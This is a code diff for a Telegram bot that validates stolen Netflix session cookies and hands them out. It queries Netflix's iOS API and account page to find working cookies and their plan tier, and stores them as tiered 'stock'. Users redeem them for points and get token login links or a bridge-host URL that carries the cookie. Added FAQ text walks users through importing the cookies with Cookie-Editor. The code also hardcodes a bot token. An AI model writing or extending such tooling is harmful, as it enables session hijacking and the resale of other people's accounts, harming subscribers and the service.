@@ -17,7 +17,7 @@ from urllib3.exceptions import InsecureRequestWarning
 TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
 bot = telebot.TeleBot(TOKEN)
 
-# 👑 إعدادات المطور الخاصة بك (فارس)
+# 👑 إعدادات المطور (فارس)
 DEVELOPER_CHAT_ID = 8713916851
 DEVELOPER_USERNAME = "farxxes"
 CHANNEL_LINK = "https://t.me/farxxess"
@@ -28,7 +28,6 @@ api_hosts = [
     "https://netflixtokengenapi.onrender.com"
 ]
 
-# تعطيل تحذيرات SSL
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
@@ -39,7 +38,7 @@ if not os.path.exists(BASE_TEMP_DIR):
 active_scans = {}
 
 # ====================================================
-# ✅ نظام الحفظ الدائم بقاعدة بيانات SQLite بدلاً من JSON
+# ✅ قاعدة البيانات المحدثة لدعم الفئات، اللغات، والتنبيهات
 # ====================================================
 DB_DIR = "database"
 if not os.path.exists(DB_DIR):
@@ -64,14 +63,85 @@ def db_execute(query, params=(), fetch=False, fetchall=False):
         return res
 
 def load_all_data():
-    db_execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, points INTEGER, username TEXT, role TEXT)''')
-    db_execute('''CREATE TABLE IF NOT EXISTS cookies (cookie TEXT PRIMARY KEY)''')
+    # إضافة حقل اللغة لقاعدة البيانات الافتراضية ar
+    db_execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, points INTEGER, username TEXT, role TEXT, lang TEXT DEFAULT 'ar')''')
+    # إضافة حقل الفئة للكوكيز المتوفرة (BASIC, STANDARD, PREMIUM)
+    db_execute('''CREATE TABLE IF NOT EXISTS cookies (cookie TEXT PRIMARY KEY, plan TEXT DEFAULT 'PREMIUM')''')
     db_execute('''CREATE TABLE IF NOT EXISTS history (cookie TEXT PRIMARY KEY)''')
     db_execute('''CREATE TABLE IF NOT EXISTS banned (chat_id INTEGER PRIMARY KEY)''')
-    print("✅ تم تجهيز قاعدة بيانات SQLite بنجاح!")
+    db_execute('''CREATE TABLE IF NOT EXISTS temp_files (id INTEGER PRIMARY KEY AUTOINCREMENT, file_path TEXT, original_name TEXT)''')
+    # جدول نظام التنبيهات للشحن
+    db_execute('''CREATE TABLE IF NOT EXISTS stock_alerts (chat_id INTEGER PRIMARY KEY, plan TEXT)''')
+    print("✅ تم تحديث وتجهيز قاعدة البيانات بنجاح!")
 
-# تحميل البيانات عند بدء التشغيل
 load_all_data()
+
+# ====================================================
+# 🌐 قاموس اللغات المتكامل للترجمة الفورية
+# ====================================================
+LANG_DICT = {
+    "ar": {
+        "welcome_new": "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!",
+        "welcome_back": "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇",
+        "btn_check": "🔍 فحص (ملف/نص/رابط)",
+        "btn_dispense": "🎁 سحب حساب نتفلكس",
+        "btn_pool": "📊 فحص المخزن والنقاط",
+        "btn_faq": "💡 المساعدة والأسئلة الشائعة",
+        "btn_lang": "🌐 Change Language / تغيير اللغة",
+        "btn_admin": "👑 لوحة تحكم المطور السريّة",
+        "no_points": "📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡",
+        "dev_mode": "♾️ وضع المطور",
+        "vip_mode": "💎 رتبة VIP",
+        "select_plan": "👇 يرجى اختيار فئة الحساب التي تريد سحبها:",
+        "plan_cost": "تكلفة",
+        "points_unit": "نقاط",
+        "point_unit": "نقطة",
+        "available": "المتوفر",
+        "btn_alert": "🔔 نبهني عند التعبئة",
+        "alert_saved": "✅ تم تفعيل التنبيه! سأرسل لك رسالة خاصة فور قيام فارس بتعبئة هذه الفئة.",
+        "alert_notify": "🔥 أبشر! تم شحن فئة {plan} الآن في المخزن، اسحب قبل نفاذ الكمية! 🍿",
+        "empty_stock": "❌ فئة {plan} فارغة حالياً! يمكنك تفعيل التنبيه بالأسفل ليتم إخطارك فور التعبئة.",
+        "pool_status": "📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n\n🔹 **المخزن المتوفر حالياً:**\n• البريميوم (Premium): {p_count} حساب\n• القياسي (Standard): {s_count} حساب\n• الأساسي (Basic): {b_count} حساب",
+        "faq_title": "💡 **قسم المساعدة والدعم الفني الذكي:**\n\nاختر المشكلة التي تواجهك من الأزرار بالأسفل وسيتم حلها فوراً:",
+        "faq_phone": "📱 كيف أشغل الكوكيز على الهاتف؟",
+        "faq_pc": "💻 كيف أشغل الكوكيز على الكمبيوتر؟",
+        "faq_phone_ans": "📱 **طريقة تشغيل الكوكيز على الهاتف:**\n\n1. قم بتحميل متصفح يدعم الإضافات مثل (Kiwi Browser).\n2. قم بتثبيت إضافة `Cookie-Editor` من سوق كروم.\n3. افتح موقع Netflix واضغط على الإضافة ثم امسح الكوكيز القديم واعمل (Import) للكوكيز المستخرج من الرابط.\n\n🎥 الشرح بالفيديو متوفر في القناة الرسمية: {link}",
+        "faq_pc_ans": "💻 **طريقة تشغيل الكوكيز على الكمبيوتر:**\n\n1. افتح متصفح Google Chrome على جهازك.\n2. ثبت إضافة `Cookie-Editor` أو استخدم الرابط المباشر الموفر من البوت.\n3. عند الضغط على الرابط المباشر، سيقوم بنقلك وتوقيع الدخول تلقائياً.\n\n🎥 لمشاهدة الطريقة بالفيديو بالتفصيل: {link}"
+    },
+    "en": {
+        "welcome_new": "Welcome to Fares's Smart Netflix Bot 😉🔥\n\n🎁 As a welcome gift, **you have been granted 5 free points** to try it out immediately!",
+        "welcome_back": "Welcome back to your updated control panel 👇",
+        "btn_check": "🔍 Check (File/Text/Link)",
+        "btn_dispense": "🎁 Dispense Netflix Account",
+        "btn_pool": "📊 Check Stock & Points",
+        "btn_faq": "💡 Help & FAQ",
+        "btn_lang": "🌐 تغيير اللغة / Change Language",
+        "btn_admin": "👑 Secret Developer Panel",
+        "no_points": "📬 Out of points! Contact developer Fares to recharge your balance 🫡",
+        "dev_mode": "♾️ Developer Mode",
+        "vip_mode": "💎 VIP Rank",
+        "select_plan": "👇 Please choose the account category you want to dispense:",
+        "plan_cost": "Cost",
+        "points_unit": "points",
+        "point_unit": "point",
+        "available": "Available",
+        "btn_alert": "🔔 Notify me when stocked",
+        "alert_saved": "✅ Notification activated! I will send you a private message as soon as Fares restocks this category.",
+        "alert_notify": "🔥 Good news! The {plan} category has just been restocked, dispense yours before it runs out! 🍿",
+        "empty_stock": "❌ {plan} category is currently empty! You can activate the notification below to be notified as soon as it is restocked.",
+        "pool_status": "📦 **Account & Stock Status:**\n\n👤 Your current balance: **{points}**\n\n🔹 **Current Available Stock:**\n• Premium: {p_count} accounts\n• Standard: {s_count} accounts\n• Basic: {b_count} accounts",
+        "faq_title": "💡 **Smart Help & Technical Support Section:**\n\nChoose the issue you are facing from the buttons below to get an immediate solution:",
+        "faq_phone": "📱 How to use cookies on Phone?",
+        "faq_pc": "💻 How to use cookies on PC?",
+        "faq_phone_ans": "📱 **How to use cookies on Phone:**\n\n1. Download a browser that supports extensions like (Kiwi Browser).\n2. Install the `Cookie-Editor` extension from the Chrome Web Store.\n3. Open Netflix, open the extension, delete old cookies, and click (Import) to paste the cookie.\n\n🎥 Video tutorial is available on our official channel: {link}",
+        "faq_pc_ans": "💻 **How to use cookies on PC:**\n\n1. Open Google Chrome on your computer.\n2. Install the `Cookie-Editor` extension or use the direct link provided by the bot.\n3. Clicking the direct link will log you in automatically.\n\n🎥 To watch the step-by-step video tutorial: {link}"
+    }
+}
+
+def get_user_lang(chat_id):
+    res = db_execute("SELECT lang FROM users WHERE chat_id=?", (chat_id,), fetch=True)
+    return res[0] if res else "ar"
+
 # ====================================================
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
@@ -110,7 +180,7 @@ def check_ban(func):
 
 def ensure_user(chat_id, username=""):
     if not db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True):
-        db_execute("INSERT INTO users (chat_id, points, username, role) VALUES (?, ?, ?, ?)", (chat_id, 5, username, "MEMBER"))
+        db_execute("INSERT INTO users (chat_id, points, username, role, lang) VALUES (?, ?, ?, ?, ?)", (chat_id, 5, username, "MEMBER", "ar"))
 
 def extract_clean_netflix_ids(text):
     cleaned_ids = []
@@ -137,19 +207,42 @@ def check_netflix_cookie_detailed(netflix_id):
             account_info = value_data.get("account", {}).get("token", {}).get("default", {})
             token = account_info.get("token")
             expires = account_info.get("expires")
+            
+            # 🔍 فحص واستخراج خطة الحساب الذكية تلقائياً من الـ API لبثها في الفئات
+            video_quality = str(value_data.get("videoQuality", "PREMIUM")).upper()
+            plan_type = "PREMIUM"
+            if "BASIC" in video_quality:
+                plan_type = "BASIC"
+            elif "STANDARD" in video_quality:
+                plan_type = "STANDARD"
+                
             if token:
                 membership_status = value_data.get("membershipStatus", "UNKNOWN")
                 is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                 geoblock_status = value_data.get("geoBlockStatus", {})
                 if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
-                    return {"token": token, "expires": expires, "bypass": False}
+                    return {"token": token, "expires": expires, "bypass": False, "plan": plan_type}
+        
         fallback_url = "https://www.netflix.com/YourAccount"
         res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
         if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
-            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
+            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "PREMIUM"}
         return None
     except Exception:
         return None
+
+# دالة ذكية لإرسال تنبيهات شحن المخزن فوراً في الخلفية
+def trigger_stock_alert_notifications(plan_name):
+    alerts = db_execute("SELECT chat_id FROM stock_alerts WHERE plan=?", (plan_name,), fetchall=True)
+    if alerts:
+        for (user_id,) in alerts:
+            lang = get_user_lang(user_id)
+            msg = LANG_DICT[lang]["alert_notify"].format(plan=plan_name)
+            try:
+                bot.send_message(user_id, msg)
+            except Exception:
+                pass
+        db_execute("DELETE FROM stock_alerts WHERE plan=?", (plan_name,))
 
 def auto_clean_pool_job():
     while True:
@@ -183,6 +276,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
     status = bot.send_message(chat_id, f"⏳ جاري فحص واستخراج الكوكيز...\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
     live_count, dead_count, dup_count = 0, 0, 0
+    newly_added_plans = set()
     
     for index, netflix_id in enumerate(netflix_ids, start=1):
         if not active_scans.get(chat_id, False):
@@ -199,12 +293,14 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
                 
         result = check_netflix_cookie_detailed(netflix_id)
         if result:
+            plan_detected = result["plan"]
             if is_duplicate:
                 dup_count += 1
             else:
                 live_count += 1
+                newly_added_plans.add(plan_detected)
                 db_execute("INSERT OR IGNORE INTO history (cookie) VALUES (?)", (netflix_id,))
-                db_execute("INSERT OR IGNORE INTO cookies (cookie) VALUES (?)", (netflix_id,))
+                db_execute("INSERT OR IGNORE INTO cookies (cookie, plan) VALUES (?, ?)", (netflix_id, plan_detected))
                 
             token = result["token"]
             expires = result["expires"]
@@ -217,8 +313,8 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             chosen_host = random.choice(api_hosts)
             bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
             dup_tag = " (مكرر شغال)" if is_duplicate else ""
-            res_text = f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
-            txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
+            res_text = f"🌟 **{plan_detected} ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
+            txt_entry = f"Cookie: {full_cookie_string}\nPlan: {plan_detected}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
             markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
             safe_send_message(chat_id, res_text, markup)
@@ -235,6 +331,10 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {current_points} نقطة 🪙")
     if live_accounts_accumulator:
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
+        
+    # إطلاق التنبيهات تلقائياً إذا شُحنت الفئات المطلوبة من قبل فارس
+    for plan in newly_added_plans:
+        threading.Thread(target=trigger_stock_alert_notifications, args=(plan,), daemon=True).start()
 
 def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
     if not netflix_ids:
@@ -257,6 +357,7 @@ def send_txt_file(chat_id, accounts_list, original_filename):
         print(e)
 
 def generate_main_keyboard(user_id):
+    lang = get_user_lang(user_id)
     user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (user_id,), fetch=True)
     if user_data:
         points, role = user_data[0], user_data[1]
@@ -265,18 +366,17 @@ def generate_main_keyboard(user_id):
 
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
-    markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_check"], callback_data="menu_check"))
+    
+    # زر السحب الذكي المترجم
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_dispense"], callback_data="menu_dispense_plans"))
+    
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_pool"], callback_data="check_pool_status"))
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_faq"], callback_data="open_faq_section"))
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_lang"], callback_data="toggle_language"))
+    
     if user_id == DEVELOPER_CHAT_ID:
-        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
-    elif role == "VIP":
-        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع الـ VIP لا ينتهي 💎)", callback_data="dispense_live_link"))
-    elif points > 0:
-        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (تكلفة: 1 نقطة) 🪙", callback_data="dispense_live_link"))
-    else:
-        markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
-    markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
-    if user_id == DEVELOPER_CHAT_ID:
-        markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
+        markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_admin"], callback_data="open_admin_panel"))
     return markup
 
 @bot.message_handler(commands=['start'])
@@ -285,11 +385,172 @@ def send_welcome(message):
     chat_id = message.chat.id
     is_new = db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True) is None
     ensure_user(chat_id, message.from_user.username or "")
-    if is_new:
-        welcome_txt = "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!"
-    else:
-        welcome_txt = "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇"
+    lang = get_user_lang(chat_id)
+    
+    welcome_txt = LANG_DICT[lang]["welcome_new"] if is_new else LANG_DICT[lang]["welcome_back"]
     bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))
+
+# ====================================================
+# 🗂️ نظام تقسيم المخزن إلى فئات والتنبيهات المترجم
+# ====================================================
+@bot.callback_query_handler(func=lambda call: call.data == "menu_dispense_plans")
+@check_ban
+def show_plans_menu(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    
+    # جلب الإحصائيات اللحظية لكل فئة
+    p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
+    s_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='STANDARD'", fetch=True)[0]
+    b_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='BASIC'", fetch=True)[0]
+    
+    markup = InlineKeyboardMarkup()
+    markup.row_width = 1
+    
+    # صياغة أزرار الفئات مع السعر والعدد المتوفر ديناميكياً
+    p_text = f"💎 Premium ({LANG_DICT[lang]['plan_cost']}: 3 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {p_count}]"
+    s_text = f"✨ Standard ({LANG_DICT[lang]['plan_cost']}: 2 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {s_count}]"
+    b_text = f"⚙️ Basic ({LANG_DICT[lang]['plan_cost']}: 1 {LANG_DICT[lang]['point_unit']}) [{LANG_DICT[lang]['available']}: {b_count}]"
+    
+    markup.add(
+        InlineKeyboardButton(p_text, callback_data="pull_account_PREMIUM_3"),
+        InlineKeyboardButton(s_text, callback_data="pull_account_STANDARD_2"),
+        InlineKeyboardButton(b_text, callback_data="pull_account_BASIC_1")
+    )
+    
+    bot.edit_message_text(LANG_DICT[lang]["select_plan"], chat_id, call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("pull_account_"))
+@check_ban
+def handle_pull_account_category(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    data_parts = call.data.split("_")
+    plan_target = data_parts[2]
+    cost = int(data_parts[3])
+    
+    ensure_user(chat_id)
+    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
+    points, role = user_data[0], user_data[1]
+    
+    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and points < cost:
+        bot.answer_callback_query(call.id, LANG_DICT[lang]["no_points"], show_alert=True)
+        return
+        
+    count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan=?", (plan_target,), fetch=True)[0]
+    if count == 0:
+        # المخزن فارغ! يظهر زر "🔔 نبهني عند التعبئة" فوراً
+        bot.answer_callback_query(call.id, LANG_DICT[lang]["empty_stock"].format(plan=plan_target), show_alert=False)
+        markup = InlineKeyboardMarkup().add(InlineKeyboardButton(LANG_DICT[lang]["btn_alert"], callback_data=f"activate_alert_{plan_target}"))
+        bot.edit_message_text(LANG_DICT[lang]["empty_stock"].format(plan=plan_target), chat_id, call.message.message_id, reply_markup=markup)
+        return
+        
+    bot.answer_callback_query(call.id, "⏳ Dispensing...")
+    
+    while True:
+        cookie_row = db_execute("SELECT cookie FROM cookies WHERE plan=? LIMIT 1", (plan_target,), fetch=True)
+        if not cookie_row:
+            break
+        current_cookie = cookie_row[0]
+        db_execute("DELETE FROM cookies WHERE cookie=?", (current_cookie,))
+        
+        fresh_result = check_netflix_cookie_detailed(current_cookie)
+        if fresh_result:
+            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
+                db_execute("UPDATE users SET points = points - ? WHERE chat_id=?", (cost, chat_id))
+                points -= cost
+            
+            db_execute("INSERT INTO cookies (cookie, plan) VALUES (?, ?)", (current_cookie, plan_target))
+            token = fresh_result["token"]
+            expires = fresh_result["expires"]
+            if isinstance(expires, int) and len(str(expires)) == 13:
+                expires //= 1000
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+            full_cookie_string = f"NetflixId={current_cookie}"
+            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
+            encoded_cookie = urllib.parse.quote(full_cookie_string)
+            chosen_host = random.choice(api_hosts)
+            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
+            short_id = current_cookie[:20]
+            
+            points_display = LANG_DICT[lang]["dev_mode"] if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points} {LANG_DICT[lang]['points_unit']}")
+            
+            if lang == "ar":
+                success_text = f"🎉 **تفضّل رابط نتفلكس الطازج الخاص بك ({plan_target})** 🎉\n\n🪙 رصيدك المتبقي الحالي: {points_display}.\n📅 **تاريخ الفواتير القادم:** {date_str}\n\n🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}"
+            else:
+                success_text = f"🎉 **Here is your fresh Netflix link ({plan_target})** 🎉\n\n🪙 Your remaining balance: {points_display}.\n📅 **Next billing date:** {date_str}\n\n🔗 **Direct Login Link:**\n{direct_netflix_url}"
+                
+            user_markup = InlineKeyboardMarkup()
+            user_markup.row_width = 2
+            user_markup.add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
+            user_markup.add(InlineKeyboardButton("✅ Yes, Works", callback_data=f"fb_yes_{short_id}"), InlineKeyboardButton("❌ No, Dead", callback_data=f"fb_no_{short_id}"))
+            
+            bot.send_message(chat_id, success_text, reply_markup=user_markup, parse_mode="Markdown")
+            return
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("activate_alert_"))
+@check_ban
+def save_stock_alert_request(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    plan_target = call.data.split("_")[2]
+    
+    db_execute("INSERT OR IGNORE INTO stock_alerts (chat_id, plan) VALUES (?, ?)", (chat_id, plan_target))
+    bot.answer_callback_query(call.id, LANG_DICT[lang]["alert_saved"], show_alert=True)
+    # العودة للوحة الرئيسية
+    bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
+
+# ====================================================
+# 🌐 نظام تغيير اللغة الذكي
+# ====================================================
+@bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
+def switch_user_language(call):
+    chat_id = call.message.chat.id
+    current_lang = get_user_lang(chat_id)
+    new_lang = "en" if current_lang == "ar" else "ar"
+    
+    db_execute("UPDATE users SET lang=? WHERE chat_id=?", (new_lang, chat_id))
+    bot.answer_callback_query(call.id, "🌐 Done / تم تغيير اللغة بنجاح!")
+    
+    # تحديث الواجهة فورياً باللغة الجديدة
+    bot.edit_message_text(LANG_DICT[new_lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
+
+# ====================================================
+# 💡 قسم الأسئلة الشائعة والمساعدة التفاعلي (FAQ)
+# ====================================================
+@bot.callback_query_handler(func=lambda call: call.data == "open_faq_section")
+@check_ban
+def faq_menu_handler(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["faq_phone"], callback_data="faq_answer_phone"))
+    markup.add(InlineKeyboardButton(LANG_DICT[lang]["faq_pc"], callback_data="faq_answer_pc"))
+    markup.add(InlineKeyboardButton("⬅️ Back / عودة", callback_data="faq_back_to_main"))
+    
+    bot.edit_message_text(LANG_DICT[lang]["faq_title"], chat_id, call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("faq_answer_"))
+def faq_answers_sender(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    topic = call.data.split("_")[2]
+    
+    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back / عودة", callback_data="open_faq_section"))
+    
+    if topic == "phone":
+        bot.edit_message_text(LANG_DICT[lang]["faq_phone_ans"].format(link=CHANNEL_LINK), chat_id, call.message.message_id, reply_markup=markup)
+    elif topic == "pc":
+        bot.edit_message_text(LANG_DICT[lang]["faq_pc_ans"].format(link=CHANNEL_LINK), chat_id, call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "faq_back_to_main")
+def faq_back_button(call):
+    chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
+    bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
+
+# ====================================================
 
 @bot.message_handler(commands=['id'])
 @check_ban
@@ -363,74 +624,6 @@ def unban_user_command(message):
     except Exception:
         bot.reply_to(message, "⚠️ الاستخدام: بالرد `/unban` أو عادياً `/unban [الآيدي]`")
 
-def execute_dispense_logic(chat_id):
-    ensure_user(chat_id)
-    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
-    points, role = user_data[0], user_data[1]
-    
-    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and points <= 0:
-        return {"status": "no_points"}
-        
-    count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
-    if count == 0:
-        return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أولاً لتعبئته."}
-        
-    while True:
-        cookie_row = db_execute("SELECT cookie FROM cookies LIMIT 1", fetch=True)
-        if not cookie_row:
-            break
-        current_cookie = cookie_row[0]
-        db_execute("DELETE FROM cookies WHERE cookie=?", (current_cookie,))
-        
-        fresh_result = check_netflix_cookie_detailed(current_cookie)
-        if fresh_result:
-            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
-                db_execute("UPDATE users SET points = points - 1 WHERE chat_id=?", (chat_id,))
-                points -= 1
-            
-            db_execute("INSERT INTO cookies (cookie) VALUES (?)", (current_cookie,))
-            token = fresh_result["token"]
-            expires = fresh_result["expires"]
-            if isinstance(expires, int) and len(str(expires)) == 13:
-                expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
-            full_cookie_string = f"NetflixId={current_cookie}"
-            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
-            encoded_cookie = urllib.parse.quote(full_cookie_string)
-            chosen_host = random.choice(api_hosts)
-            bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
-            short_id = current_cookie[:20]
-            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{points} نقطة")
-            success_text = (f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n🪙 رصيدك المتبقي الحالي: {points_display}.\n📅 **تاريخ الفواتير القادم:** {date_str}\n\n🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇")
-            user_markup = InlineKeyboardMarkup()
-            user_markup.row_width = 2
-            user_markup.add(InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
-            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
-            user_markup.add(InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}"))
-            
-            return {"status": "success", "text": success_text, "markup": user_markup}
-    return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}
-
-@bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
-@check_ban
-def handle_ask_method(call):
-    bot.answer_callback_query(call.id)
-    chan_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 اضغط هنا لمشاهدة الطريقة", url=CHANNEL_LINK))
-    bot.send_message(call.message.chat.id, "🤔 **هل تريد الطريقة؟**\n\nإذاً نعم، سوف أعطيك رابط قناتي متوفر فيها الشرح بالكامل بالتفصيل 👇", reply_markup=chan_markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
-@check_ban
-def dispense_account_on_button(call):
-    chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id, "⏳ جاري فحص الحساب وسحب الرابط...")
-    response = execute_dispense_logic(chat_id)
-    if response["status"] == "success":
-        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-    elif response["status"] == "no_points":
-        bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
-    else:
-        bot.send_message(chat_id, response["message"])
-
 @bot.callback_query_handler(func=lambda call: call.data == "menu_check")
 def menu_check_button(call):
     bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً!", call.message.chat.id, call.message.message_id)
@@ -439,6 +632,7 @@ def menu_check_button(call):
 @check_ban
 def pool_status(call):
     chat_id = call.message.chat.id
+    lang = get_user_lang(chat_id)
     bot.answer_callback_query(call.id)
